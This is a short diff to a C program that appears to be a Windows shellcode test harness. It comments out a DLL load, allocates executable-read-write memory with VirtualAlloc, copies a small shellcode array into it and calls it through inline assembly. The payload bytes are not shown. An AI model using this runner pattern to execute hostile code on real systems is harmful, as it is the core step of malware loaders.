@@ -7,10 +7,10 @@ unsigned char shellcode[] = {
 
 void main()
 {
-	LoadLibrary("Marshall，D，Teach.dll");
-	char* pByte = (char*)VirtualAlloc(NULL, 1024, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
+	//LoadLibrary("Marshall，D，Teach.dll");
+	char* pByte = (char*)VirtualAlloc(NULL, 50000, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
 	memset(pByte, 0, 1024);
-	memcpy_s(pByte, 1000, shellcode, 6);
+	memcpy_s(pByte, 10000, shellcode, 6);
 	_asm{
 		call pByte;
 	}
